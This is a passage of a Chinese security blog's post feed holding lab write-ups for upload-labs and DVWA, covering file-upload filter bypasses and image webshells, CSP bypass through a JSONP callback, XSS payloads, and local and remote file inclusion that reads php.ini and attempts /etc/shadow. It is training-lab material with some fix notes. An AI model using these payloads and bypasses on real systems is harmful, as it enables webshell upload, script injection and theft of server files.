class="hljs-comment">//转换为小写</span>        $file_ext = <span class="hljs-keyword">trim</span>($file_ext); <span class="hljs-comment">//首尾去空</span></code></pre><p><code>strrchr()</code> 返回 <code>“ . ”</code>再字符串中出现的最后一个位置。所以我在<code>pass08</code>尝试 点空绕过，最后会没有后缀名。原因就是它截取的是最后一个点后的字符串<code>$file_ext。$file_ext</code>在匹配黑名单，最后一个字符串为空就不存在被限制的作用</p><p>最后代码中的文件名拼接采用的初始<code>filename</code>后缀名，依照以上以上思路采用点空绕过，<br><img src="./20.png" srcset="/img/loading.gif" alt=""><br><img src="./21.png" srcset="/img/loading.gif" alt=""></p><h2 id="pass10"><a href="#pass10" class="headerlink" title="pass10"></a>pass10</h2><pre><code class="hljs php">$is_upload = <span class="hljs-keyword">false</span>;$msg = <span class="hljs-keyword">null</span>;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'submit'</span>])) &#123;    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;        $deny_ext = <span class="hljs-keyword">array</span>(<span class="hljs-string">"php"</span>,<span class="hljs-string">"php5"</span>,<span class="hljs-string">"php4"</span>,<span class="hljs-string">"php3"</span>,<span class="hljs-string">"php2"</span>,<span class="hljs-string">"html"</span>,<span class="hljs-string">"htm"</span>,<span class="hljs-string">"phtml"</span>,<span class="hljs-string">"pht"</span>,<span class="hljs-string">"jsp"</span>,<span class="hljs-string">"jspa"</span>,<span class="hljs-string">"jspx"</span>,<span class="hljs-string">"jsw"</span>,<span class="hljs-string">"jsv"</span>,<span class="hljs-string">"jspf"</span>,<span class="hljs-string">"jtml"</span>,<span class="hljs-string">"asp"</span>,<span class="hljs-string">"aspx"</span>,<span class="hljs-string">"asa"</span>,<span class="hljs-string">"asax"</span>,<span class="hljs-string">"ascx"</span>,<span class="hljs-string">"ashx"</span>,<span class="hljs-string">"asmx"</span>,<span class="hljs-string">"cer"</span>,<span class="hljs-string">"swf"</span>,<span class="hljs-string">"htaccess"</span>);        $file_name = trim($_FILES[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'name'</span>]);        $file_name = str_ireplace($deny_ext,<span class="hljs-string">""</span>, $file_name);<span class="hljs-comment">//忽略大小写，替换所有出现$deny_ext为空</span>        $temp_file = $_FILES[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'tmp_name'</span>];        $img_path = UPLOAD_PATH.<span class="hljs-string">'/'</span>.$file_name;                <span class="hljs-keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;            $is_upload = <span class="hljs-keyword">true</span>;        &#125; <span class="hljs-keyword">else</span> &#123;            $msg = <span class="hljs-string">'上传出错！'</span>;        &#125;    &#125; <span class="hljs-keyword">else</span> &#123;        $msg = UPLOAD_PATH . <span class="hljs-string">'文件夹不存在,请手工创建！'</span>;    &#125;&#125;</code></pre><p>黑名单，替换函数，使用双写绕过。<br><img src="./22.png" srcset="/img/loading.gif" alt=""></p><h1 id="0x06-白名单绕过"><a href="#0x06-白名单绕过" class="headerlink" title="0x06 白名单绕过"></a>0x06 白名单绕过</h1><p><strong>白名单的过滤方式与黑名单恰恰相反，黑民动感是定义不允许上传的文件扩展名，而白名单则是定义允许上传的扩展名，白名单拥有比黑名单更好的防御机制</strong></p><h2 id="pass11"><a href="#pass11" class="headerlink" title="pass11"></a>pass11</h2><p>存储路径可控。<br><code>url</code>中解析<code>%00</code>为<code>\000</code>，而PHP文件只解析<code>\000</code>前的文件</p><p>本关 路径可控 <code>../upload/2.php%002.gif</code>&gt;&gt;<code>2.php</code></p><pre><code class="hljs php">$is_upload = <span class="hljs-keyword">false</span>;$msg = <span class="hljs-keyword">null</span>;<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'submit'</span>]))&#123;    $ext_arr = <span class="hljs-keyword">array</span>(<span class="hljs-string">'jpg'</span>,<span class="hljs-string">'png'</span>,<span class="hljs-string">'gif'</span>);    $file_ext = substr($_FILES[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'name'</span>],strrpos($_FILES[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'name'</span>],<span class="hljs-string">"."</span>)+<span class="hljs-number">1</span>);    <span class="hljs-keyword">if</span>(in_array($file_ext,$ext_arr))&#123;        $temp_file = $_FILES[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'tmp_name'</span>];        $img_path = $_GET[<span class="hljs-string">'save_path'</span>].<span class="hljs-string">"/"</span>.rand(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>).date(<span class="hljs-string">"YmdHis"</span>).<span class="hljs-string">"."</span>.$file_ext;        <span class="hljs-keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;            $is_upload = <span class="hljs-keyword">true</span>;        &#125; <span class="hljs-keyword">else</span> &#123;            $msg = <span class="hljs-string">'上传出错！'</span>;        &#125;    &#125; <span class="hljs-keyword">else</span>&#123;        $msg = <span class="hljs-string">"只允许上传.jpg|.png|.gif类型文件！"</span>;    &#125;&#125;</code></pre><p><img src="./23.png" srcset="/img/loading.gif" alt=""></p><h2 id="pass12"><a href="#pass12" class="headerlink" title="pass12"></a>pass12</h2><p><code>POST</code>路径可控，但是无法通过直接添加<code>%00</code>解析，需要通过二进制添加。在<code>0d 0a</code>前添加<code>byte 00</code><br><img src="./24.png" srcset="/img/loading.gif" alt=""><br><img src="./25.png" srcset="/img/loading.gif" alt=""><br><img src="./26.png" srcset="/img/loading.gif" alt=""></p><h2 id="pass13"><a href="#pass13" class="headerlink" title="pass13"></a>pass13</h2><p>源码需要检查文件开头的两字节是否为图片标志<br><img src="./27.png" srcset="/img/loading.gif" alt=""><br>1)使用<code>windows 10  copy normal.gif /b + xx.php /a webshell.gif</code><br><img src="./28.png" srcset="/img/loading.gif" alt=""><br>2)源码是抽取前两个字节，可以直接在PHP前直接添加字符GIF，也是能成功绕过<br><img src="./29.png" srcset="/img/loading.gif" alt=""><br><code>NOTIC：</code>接下来就是需要使用文件包含漏洞http协议打开，才能使得用PHP方式解析。而且这里文件路径不可控无法使用%00截断。</p><h1 id="0x07-函数限制绕过"><a href="#0x07-函数限制绕过" class="headerlink" title="0x07 函数限制绕过"></a>0x07 函数限制绕过</h1><h2 id="pass14"><a href="#pass14" class="headerlink" title="pass14"></a>pass14</h2><p><code>getimagesize()</code>获取图像相关信息<br>索引0包含图像宽度的像素值，1 包含图像高度的像素值，2 是图像类型的标记<br><code>image_type_to_extension()</code>获取文件后缀名<br><code>stripos(a,b)</code>字符<code>b</code>在<code>a</code>中出现的首次位置</p><p>代码提取文件名后缀，判断后缀名是否在<code>$type=&#39;.jpeg|.png|.gif&#39;</code>中 </p><p>与PAss13 相似使用图像木马绕过<br><img src="./30.png" srcset="/img/loading.gif" alt=""></p><h2 id="pass15"><a href="#pass15" class="headerlink" title="pass15"></a>pass15</h2><p><code>exif_imagetype()</code> 读取一个图像的第一个字节并检查其签名   和<code>$_SERVER[&#39;HTTP ACCEPT&#39;]</code> 结合使用来检查浏览器是否可以显示某个指定的图像。<br>与<code>getmagesize()</code>它还检查签名<br>与PASS14相同上传图片木马即可<br><img src="./31.png" srcset="/img/loading.gif" alt=""></p><h1 id="0x08-二次渲染"><a href="#0x08-二次渲染" class="headerlink" title="0x08 二次渲染"></a>0x08 二次渲染</h1><h2 id="pass16"><a href="#pass16" class="headerlink" title="pass16"></a>pass16</h2><p><code>imagecreatefromgif()</code> 判断图片类型，对图片进行二次渲染.<br>这里<code>move_upload_file()</code>图片移动之后，是经够了<code>imagecreatefromgif</code>渲染修改后再重新覆盖修改。<br><img src="./32.png" srcset="/img/loading.gif" alt=""></p><p>上传图片木马之后，一句话木马被渲染丢失<br><img src="./33.png" srcset="/img/loading.gif" alt=""><br><img src="./34.png" srcset="/img/loading.gif" alt=""></p><p>通过WINHEX数据比较可得<br>0~798 数据相同未被修改，在未被修改的区域填入一句话木马，成功上传，并且未被因渲染而丢失<br><img src="./35.png" srcset="/img/loading.gif" alt=""></p><h1 id="0x09-条件竞争"><a href="#0x09-条件竞争" class="headerlink" title="0x09 条件竞争"></a>0x09 条件竞争</h1><h2 id="PASS17"><a href="#PASS17" class="headerlink" title="PASS17"></a>PASS17</h2><p>源码可知存在条件竞争，上传速度大于匹配unlink条件就能显示webshell界面<br>想着写个脚本捕获数据，发现线程太大，电脑带不动。pass18也是如此<br><img src="./36.png" srcset="/img/loading.gif" alt=""><br><img src="./37.png" srcset="/img/loading.gif" alt=""></p><h3 id="修复理解"><a href="#修复理解" class="headerlink" title="修复理解"></a>修复理解</h3><blockquote><blockquote><blockquote></blockquote><p><strong>不应该把move_upload_file()函数置于判断条件头，应先执行白名单判断。</strong></p></blockquote></blockquote><h1 id="pass19"><a href="#pass19" class="headerlink" title="pass19"></a>pass19</h1><p>重命名出 采用空格点号绕过可以成功上传<br>可以看到这里去点是在重命名之前，所以我们可以通过 <code>2.php. .</code> 所以点号是不会被去除<br><img src="./38.png" srcset="/img/loading.gif" alt=""></p><h1 id="0x09-修复上传漏洞"><a href="#0x09-修复上传漏洞" class="headerlink" title="0x09 修复上传漏洞"></a>0x09 修复上传漏洞</h1><blockquote><blockquote><blockquote></blockquote></blockquote></blockquote><ul><li><strong>目录过滤不严，攻击者可能建立畸形目录</strong></li><li><strong>文件未重命名，攻击者可能利用Web容器解析漏洞</strong></li></ul><p><strong>当然满足这些还是不够，还存在Web容器解析漏洞。</strong></p><h1 id="0x010-总结"><a href="#0x010-总结" class="headerlink" title="0x010 总结"></a>0x010 总结</h1><p>附上一张图<br><img src="./39.png" srcset="/img/loading.gif" alt=""></p><p>文件上传首先需要判断是客户端做出了限制还是服务端</p><ol><li><p>客户端需要修改JS条件语句</p></li><li><p>服务端<br>白名单00截断需要判断路径是否可控且是否重命名，版本需要5.2以下。<br>黑名单需要考虑图片木马，特殊符号组合过滤，特殊后缀名解析方式</p></li><li><p>若服务端对文件进行函数判断，主要是二次渲染会造成麻烦</p></li><li><p>条件竞争，可以采用burp重发重读</p></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>文件上传</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DVWA_[CSP-Bypass]</title>
    <link href="/2018/12/29/DVWA-CSP-Bypass/"/>
    <url>/2018/12/29/DVWA-CSP-Bypass/</url>
    
    <content type="html"><![CDATA[<h1 id="0x01-Json基本语法"><a href="#0x01-Json基本语法" class="headerlink" title="0x01 Json基本语法"></a>0x01 Json基本语法</h1><h2 id="定义："><a href="#定义：" class="headerlink" title="定义："></a>定义：</h2><p>JSON是存储和交换文本信息的语法，类似XML</p><p><img src="./1.png" srcset="/img/loading.gif" alt=""><br>所对应的键值，通过<code>EVAL()</code>转换为JAVASCRIPT的对象，可以通过document.getElementById调用</p><h2 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h2><p>JSON具有层级结构（值中存在值）<br>JSON可通过javascript解析</p><h2 id="语法规则"><a href="#语法规则" class="headerlink" title="语法规则"></a>语法规则</h2><p>数据在名称/值对中<br>数据由逗号分隔<br>花括号保存对象<br>方括号保存数组<br><img src="./2.png" srcset="/img/loading.gif" alt=""></p><h2 id="安全性"><a href="#安全性" class="headerlink" title="安全性"></a>安全性</h2><p><code>eval()</code>解析<code>JSON</code>语法存在安全性问题，<code>eval()</code>可解析并执行脚本。建议使用<code>JSON</code>解析器，解析成原生<code>JS</code>对象</p><h1 id="0x02-CSP知识点补充"><a href="#0x02-CSP知识点补充" class="headerlink" title="0x02 CSP知识点补充"></a>0x02 CSP知识点补充</h1><h2 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h2><p>新的 Content-Security-Policy HTTP响应头可以帮助你通过声明，其动态资源允许加载减少对现代浏览器XSS风险<br><a href="https://lorexxar.cn/2016/08/08/ccsp/" target="_blank" rel="noopener">https://lorexxar.cn/2016/08/08/ccsp/</a></p><h2 id="CSP属性"><a href="#CSP属性" class="headerlink" title="CSP属性"></a>CSP属性</h2><ol><li><p><code>child-src</code>:管理套嵌浏览部分<br>匹配<code>iframe</code>和<code>frame</code>标签 使得 <code>src</code>=”地址”会被CSP拦截</p></li><li><p><code>connetct-src</code>:限制了可使用的脚本加载的url，也控制websock连接</p><blockquote><blockquote></blockquote><p>如<code>&lt;a ping=&quot;http://not-example.com&quot;&gt;</code>  <code>a</code>标签会被阻止<code>&lt;script&gt;</code></p></blockquote><pre><code class="hljs dust"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><span class="xml">  var xhr = new XMLHttpRequest();</span><span class="xml">  xhr.open('GET', 'https://not-example.com/');</span><span class="xml">  xhr.send();</span><span class="xml">  var ws = new WebSocket("https://not-example.com/");</span><span class="xml">  var es = new EventSource("https://not-example.com/");</span><span class="xml">  navigator.sendBeacon("https://not-example.com/", </span><span class="hljs-template-variable">&#123; ... &#125;</span><span class="xml">);</span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>  </span><span class="xml">websock会被阻止</span></code></pre></li></ol><ol start="3"><li><code>default-src</code>:作为其他指令的备用，意思是说除了被设置的属性，其他都是按default-src设置</li></ol><p>如果设置了<br><code>Content-Security-Policy: default-src &#39;self&#39;; script-src https://example.com</code><br>就会出现如下代码情况</p><pre><code class="hljs csp"><span class="hljs-attribute">Content-Security-Policy</span>: <span class="hljs-keyword">child-src</span> <span class="hljs-string">'self'</span>;                         <span class="hljs-keyword">connect-src</span> <span class="hljs-string">'self'</span>;                         <span class="hljs-keyword">font-src</span> <span class="hljs-string">'self'</span>;                         <span class="hljs-keyword">img-src</span> <span class="hljs-string">'self'</span>;                         <span class="hljs-keyword">media-src</span> <span class="hljs-string">'self'</span>;                         <span class="hljs-keyword">object-src</span> <span class="hljs-string">'self'</span>;                         <span class="hljs-keyword">script-src</span> https://example.com;                         <span class="hljs-keyword">style-src</span> <span class="hljs-string">'self'</span></code></pre><ol start="4"><li><code>font-src</code>:限制了所以可以被加载的字体资源<br>如果设置字体属性<br><code>font-family:&quot;Example Font&quot;</code>  会返回错误</li><li><code>img-src</code>:限制加载图片的来源</li></ol><h1 id="0x03-DVWA-CSP-BYPASS"><a href="#0x03-DVWA-CSP-BYPASS" class="headerlink" title="0x03 DVWA_CSP BYPASS"></a>0x03 DVWA_CSP BYPASS</h1><h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><p>允许加载 以下几个网站加载的js文件。在注释里有创建一个<a href="https://pastebin.com/raw/R570EE00JS脚本源" target="_blank" rel="noopener">https://pastebin.com/raw/R570EE00JS脚本源</a><br><img src="./3.png" srcset="/img/loading.gif" alt=""><br><img src="./4.png" srcset="/img/loading.gif" alt=""></p><h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><p>允许属性名为<code>TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=</code>  加载<code>js</code>脚本<br><img src="./5.png" srcset="/img/loading.gif" alt=""><br><img src="./6.png" srcset="/img/loading.gif" alt=""><br><img src="./7.png" srcset="/img/loading.gif" alt=""><br>若执行错误脚本会在控制台如下错误信息显示<br><code>&lt;img src=hacked onerror=alert(&#39;hacked&#39;)&gt;</code></p><p><img src="./8.png" srcset="/img/loading.gif" alt=""></p><h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><h3 id="代码简析"><a href="#代码简析" class="headerlink" title="代码简析"></a>代码简析</h3><p>形成<code>&lt;script src=&quot;source/jsonp.php?callback=solveSum&quot;&gt;&lt;/script&gt;</code><br><img src="./9.png" srcset="/img/loading.gif" alt=""><br>调用并生成json<br><img src="./10.png" srcset="/img/loading.gif" alt=""><br>触发按钮执行<code>high.js</code>脚本<br><img src="./11.png" srcset="/img/loading.gif" alt=""></p><h3 id="正题"><a href="#正题" class="headerlink" title="正题"></a>正题</h3><p>本题一直理解成修改<code>jsonp.ph</code>p函数，其实是要求我们对js执行代码的修改。<br>首先分析JS。php脚本执行流程<br><code>json.php</code>脚本</p><blockquote><blockquote><ol><li><code>GET</code>方法接收<code>callback</code>参数.</li><li><code>&quot;answer&quot;</code>赋值15（形成<code>JSON</code>,这里<code>high.js</code>脚本对够成<code>json</code>形式）</li><li>输出<code>answer</code>值<br><img src="./12.png" srcset="/img/loading.gif" alt=""><br>网页事件执行</li></ol></blockquote><p>点击<code>BUTTON</code>触发<code>clickButton()</code>&gt;&gt;执行<code>s.src = &quot;source/jsonp.php?callback=solveSum&quot;;</code>&gt;&gt;语句调用<code>jsonp.php</code>&gt;&gt;<code>jsonp.php</code>做的事是GET接收值，创建关于<code>answer</code>数组。<code>(JSON)</code></p><blockquote><p><code>$callback . &quot;(&quot;.json_encode($outp).&quot;)&quot;</code>方法为JS调用JSON对象</p></blockquote></blockquote><h3 id="目的-方法"><a href="#目的-方法" class="headerlink" title="目的(方法)"></a>目的(方法)</h3><blockquote><blockquote><p><code>callback</code>参数可控！！！！！！！</p></blockquote></blockquote><p>这里只要对<code>s.src = &quot;source/jsonp.php?callback=solveSum&quot;</code>修改<code>callback</code>参数为自己想要执行的js代码就可以使得网页正常回显。</p><pre><code class="hljs erlang-repl">script标签中内容会以JS解析，所以callback参数后内容会被执行!!!!!</code></pre><p><code>&lt;script src=&quot;source/jsonp.php?callback=alert(&#39;hacked&#39;);&quot;&gt;&lt;/script&gt;</code><br>PS:唉我却一直在纠结jsonp.php下的callback参数修改,是行不通的</p><h3 id="High-php-gt-gt-include参数使用解题"><a href="#High-php-gt-gt-include参数使用解题" class="headerlink" title="High.php&gt;&gt;include参数使用解题"></a>High.php&gt;&gt;include参数使用解题</h3><p>那么我们要怎么在不修改代码情况下执行JS脚本，可以看到<code>high.php</code>中有<code>POST[&#39;include&#39;]</code>借用它就可以了。</p><p><img src="./13.png" srcset="/img/loading.gif" alt=""><br>high.php中<code>include</code>使用调用``<script src="source/jsonp.php?callback=alert('hacked');"></script>`满足传参要求。<br><img src="./14.png" srcset="/img/loading.gif" alt=""></p><h2 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h2><blockquote><blockquote></blockquote><p>删除callback参数可控，代码写死</p></blockquote><p><img src="./15.png" srcset="/img/loading.gif" alt=""><br><img src="./16.png" srcset="/img/loading.gif" alt=""></p><h1 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h1><p>csp确实可以有效防止XSS注入，但是也必须使用得当。为什么现在csp使用较少，因为它限制了许多JS脚本的灵活使用。<br>所以CSP安全策略如果使用不当是可以绕过的。!!!!</p>]]></content>
    
    
    
    <tags>
      
      <tag>XSS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DVWA_XSS</title>
    <link href="/2018/12/28/DVWA-XSS/"/>
    <url>/2018/12/28/DVWA-XSS/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote><blockquote></blockquote><p>XSS，全称<code>Cross Site Scripting</code>，即跨站脚本攻击，某种意义上也是一种注入攻击，是指攻击者在页面中注入恶意的脚本代码，当受害者访问该页面时，恶意代码会在其浏览器上执行，需要强调的是，<code>XSS</code>不仅仅限于<code>JavaScript</code>，还包括<code>flash</code>等其它脚本语言。根据恶意代码是否存储在服务器中，<code>XSS</code>可以分为存储型的<code>XSS</code>与反射型的<code>XSS</code>。</p></blockquote><p>摘自<a href="https://www.incapsula.com/web-application-security/reflected-xss-attacks.html" target="_blank" rel="noopener">https://www.incapsula.com/web-application-security/reflected-xss-attacks.html</a><br>反射型XSS</p><blockquote><blockquote></blockquote></blockquote><ul><li>当恶意脚本从Web应用程序反射到受害者的浏览器时，就会发生反射的XSS攻击，也称为非持久性攻击</li><li>该脚本通过链接激活，该链接向具有漏洞的网站发送请求，该漏洞允许执行恶意脚本。该漏洞通常是传入请求未被充分清理的结果，这允许操纵Web应用程序的功能和激活恶意脚本。</li><li>为了分发恶意链接，犯罪者通常将其嵌入到电子邮件或第三方网站中（例如，在评论部分或社交媒体中）。该链接嵌入在锚文本中，该文本激发用户点击它，从而向被利用的网站发起<code>XSS</code>请求，将攻击反映给用户</li></ul><p>存储型XSS</p><blockquote><blockquote></blockquote></blockquote><ul><li>为了成功执行存储的<code>XSS</code>攻击，犯罪者必须在<code>Web</code>应用程序中找到漏洞，然后将恶意脚本注入其服务器（例如，通过注释字段）。</li><li>最常见的目标之一是允许用户共享内容的网站，包括博客，社交网络，视频共享平台和留言板。每次查看受感染的页面时，恶意脚本都会传输到受害者的浏览器。</li></ul><h1 id="XSS-Reflected"><a href="#XSS-Reflected" class="headerlink" title="XSS (Reflected)"></a>XSS (Reflected)</h1><h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><p>在输入框写入<code>&lt;script&gt;alert&lt;/script&gt;</code>有弹窗，表名有XSS注入<br>代码未对name进行过滤，且name插入html标签中，可以植入js恶意代码。<br><img src="./1.png" srcset="/img/loading.gif" alt=""></p><h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><p>源码对<code>&lt;script&gt;</code>标签过滤，采用双写绕过<br><img src="./2.png" srcset="/img/loading.gif" alt=""></p><p>1）双写绕过<br><code>&lt;sc&lt;script&gt;ript&gt;alert(/xss/)&lt;/script&gt;</code><br><img src="./3.png" srcset="/img/loading.gif" alt=""></p><p>2）大小写混写绕过</p><h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><p>对<code>script</code>标签正则过滤。双写，大小写混写绕过行不通。<br><img src="./5.png" srcset="/img/loading.gif" alt=""></p><p>通过<code>img</code>、<code>body</code>等标签的事件或者iframe等标签的src注入恶意的js代码</p><blockquote><blockquote><p><code>&lt;img src=1 onerror=alert(/xss/)&gt;</code><br><img src="./6.png" srcset="/img/loading.gif" alt=""></p></blockquote></blockquote><h2 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h2><p>htmlspecialchars函数把预定义的字符<code>&amp;、”、 ’、&lt;、&gt;</code>转换为HTML实体，防止浏览器将其作为HTML元素。且启用<code>anti-CSRF</code>。<br><img src="./7.png" srcset="/img/loading.gif" alt=""></p><h1 id="XSS-Stored"><a href="#XSS-Stored" class="headerlink" title="XSS (Stored)"></a>XSS (Stored)</h1><h2 id="Low-1"><a href="#Low-1" class="headerlink" title="Low"></a>Low</h2><p>对源码分析，PHP脚本只对<code>sql</code>注入做了一定的防御。但是确存在<code>stored xss</code><br>在<code>message</code> 构建 <code>payload</code> </p><blockquote><blockquote><p><code>&lt;script&gt;alert(/name/)&lt;/script&gt;</code><br><img src="./8.png" srcset="/img/loading.gif" alt=""><br><img src="./9.png" srcset="/img/loading.gif" alt=""><br>2)前端对<code>name</code>长度做了限制，使用<code>F1</code>2 修改<code>MAXlangth</code></p></blockquote></blockquote><h2 id="Medium-1"><a href="#Medium-1" class="headerlink" title="Medium"></a>Medium</h2><p>源代码对<code>message</code>做了<code>xss</code>防御，但却<code>name</code>却没有做任何防护，可以抓包对<code>name</code>进行<code>js</code>恶意代码插入<code>（双写绕过，大小写混写）。</code><br><img src="./10.png" srcset="/img/loading.gif" alt=""></p><h2 id="High-1"><a href="#High-1" class="headerlink" title="High"></a>High</h2><p>massage无法构造恶意payload<br>name对<code>&lt;script&gt;</code>标签正则过滤，我们可以采用其他标签的事件来构造恶意<code>payload</code></p><blockquote><blockquote><p><code>img</code>、<code>iframe</code>等其它危险的标签,并抓包改写。</p></blockquote></blockquote><p><img src="./11.png" srcset="/img/loading.gif" alt=""></p><p>htmlspecialchars如果没有使用正确，可以通过编码的方式绕过</p><h1 id="手工检测XSS"><a href="#手工检测XSS" class="headerlink" title="手工检测XSS"></a>手工检测XSS</h1><blockquote><blockquote></blockquote><p><strong>最重要是考虑哪里有输入，输入的数据在什么地方输出</strong></p></blockquote><ul><li><strong>可得知输出位置</strong><br>输入一些敏感字符，如<code>&quot;&lt;、&gt;&quot;、&#39;、()&quot;</code>,提交后查看HTML源代码，观察输入的字符是否被转义</li></ul><p>如果做了过滤，添上字符传AAAA 查询字符比较方便</p><ul><li><strong>无法得知输出位置</strong><br>采用输入<code>&quot;&quot;/&gt;XSS Test&quot;</code>测试</li></ul><h1 id="修复XSS跨站漏洞"><a href="#修复XSS跨站漏洞" class="headerlink" title="修复XSS跨站漏洞"></a>修复XSS跨站漏洞</h1><p>对输入与输出严格过滤</p><ul><li>转义html特殊字符<br><code>&lt;、&gt;、“、‘、&amp;</code><br>htmlspecialchars(),htmlentities()函数把预定义字符转换为HTML实体</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>XSS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DVWA_(FILE inclusion&amp;uploads)</title>
    <link href="/2018/12/28/DVWA-FILE-inclusion-uploads/"/>
    <url>/2018/12/28/DVWA-FILE-inclusion-uploads/</url>
    
    <content type="html"><![CDATA[<h1 id="File-Inclusion"><a href="#File-Inclusion" class="headerlink" title="File Inclusion"></a>File Inclusion</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>allow_url_include=On<br>allow_url_open=On(远程包含)</p><blockquote><blockquote><blockquote></blockquote><p>服务器会包含相应的文件，并将结果返回。需要特别说明的是，服务器包含文件时，不管文件后缀是否是php，都会尝试当做php文件执行，如果文件内容确为php，则会正常执行并返回结果，如果不是，则会原封不动地打印文件内容，所以文件包含漏洞常常会导致任意文件读取与任意命令执行。</p><blockquote></blockquote></blockquote></blockquote><h2 id="LOW"><a href="#LOW" class="headerlink" title="LOW"></a>LOW</h2><h3 id="本地包含"><a href="#本地包含" class="headerlink" title="本地包含"></a>本地包含</h3><pre><code class="hljs xml"><span class="php"><span class="hljs-meta">&lt;?php</span></span><span class="php"> <span class="hljs-comment">// The page we wish to display </span></span><span class="php">$file = $_GET[ <span class="hljs-string">'page'</span> ]; </span><span class="php"><span class="hljs-meta">?&gt;</span></span></code></pre><p>未对传入的page文件进行任何的过滤<br>本地包含:<br>构造<code>http://127.0.0.1/zlzhidao/vulnerabilities/fi/?page=\etc\shadow</code>判断是否为linux系统</p><p><img src="./1.png" srcset="/img/loading.gif" alt=""></p><p>报错显示为windows系统，使用绝对路径访问php.ini文件<br><code>http://127.0.0.1/zlzhidao/vulnerabilities/fi/?page=F:\phpstudy\PHPTutorial\WWW\zlzhidao\php.ini</code></p><p><img src="./2.png" srcset="/img/loading.gif" alt=""></p><p>相对路径访问php.ini<br><code>http://127.0.0.1/zlzhidao/vulnerabilities/fi/?page=../../../zlzhidao/php.ini</code><br><img src="./3.png" srcset="/img/loading.gif" alt=""></p><h3 id="远程包含"><a href="#远程包含" class="headerlink" title="远程包含"></a>远程包含</h3><p>当服务器的php配置中，选项allow_url_fopen与allow_url_include为开启状态时，服务器会允许包含远程服务器上的文件，如果对文件来源没有检查的话，就容易导致任意远程代码执行。<br>在远程服务器<code>192.168.43.195</code>上传一个<code>phpinfo.txt</code>文件，会以PHP解析在服务端打开。<br><a href="http://127.0.0.1/zlzhidao/vulnerabilities/fi/?page=http://127.0.0.1/phpinfo.txt" target="_blank" rel="noopener">http://127.0.0.1/zlzhidao/vulnerabilities/fi/?page=http://127.0.0.1/phpinfo.txt</a><br><img src="./4.png" srcset="/img/loading.gif" alt=""></p><p>打开百度链接<br><code>http://127.0.0.1/zlzhidao/vulnerabilities/fi/?page=http://www.baidu.com</code><br><img src="./5.png" srcset="/img/loading.gif" alt=""></p><h2 id="MEDIUM"><a href="#MEDIUM" class="headerlink" title="MEDIUM"></a>MEDIUM</h2><pre><code class="hljs php">&lt;php<span class="hljs-comment">//Thepagewewishtodisplay</span>$file=$_GET[<span class="hljs-string">'page'</span>];<span class="hljs-comment">//Inputvalidation</span>$file=str_replace(<span class="hljs-keyword">array</span>(<span class="hljs-string">"http://"</span>,<span class="hljs-string">"https://"</span>),<span class="hljs-string">""</span>,$file);$file=str_replace(<span class="hljs-keyword">array</span>(<span class="hljs-string">"../"</span>,<span class="hljs-string">"..\""</span>),<span class="hljs-string">""</span>,$file);&gt;</code></pre><p>服务端对<code>http:// ”、”https://”、 ” ../”、”..\”</code>替换为空字符，即删除。采用双写绕过或大小写混写就可以了。</p><h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><pre><code class="hljs php">&lt;php<span class="hljs-comment">//Thepagewewishtodisplay</span>$file=$_GET[<span class="hljs-string">'page'</span>];<span class="hljs-comment">//Inputvalidation</span><span class="hljs-keyword">if</span>(!fnmatch(<span class="hljs-string">"file*"</span>,$file)&amp;&amp;$file!=<span class="hljs-string">"include.php"</span>)&#123;   <span class="hljs-comment">//Thisisn'tthepagewewant!</span><span class="hljs-keyword">echo</span><span class="hljs-string">"ERROR:Filenotfound!"</span>;<span class="hljs-keyword">exit</span>;&#125;&gt;</code></pre><p>可以看到源码对文件开头做了限制，必须时FILE开头<br>使用系统自带file://协议打开文件</p><blockquote><blockquote><p><code>http://127.0.0.1/zlzhidao/vulnerabilities/fi/?page=file://F:\phpstudy\PHPTutorial\WWW\zlzhidao\php.ini</code></p></blockquote></blockquote><p><img src="./6.png" srcset="/img/loading.gif" alt=""></p><h3 id="php-filter-伪协议使用"><a href="#php-filter-伪协议使用" class="headerlink" title="php://filter 伪协议使用"></a>php://filter 伪协议使用</h3><p>php://filter<br>读取文件并以base64编码返回<br>利用条件:无<br>常用payload</p><blockquote><blockquote><p>php://filter/read=convert.base64-encode/resource=index.php</p></blockquote></blockquote><p><img src="./7.png" srcset="/img/loading.gif" alt=""></p><h1 id="File-Inlcusion"><a href="#File-Inlcusion" class="headerlink" title="File Inlcusion"></a>File 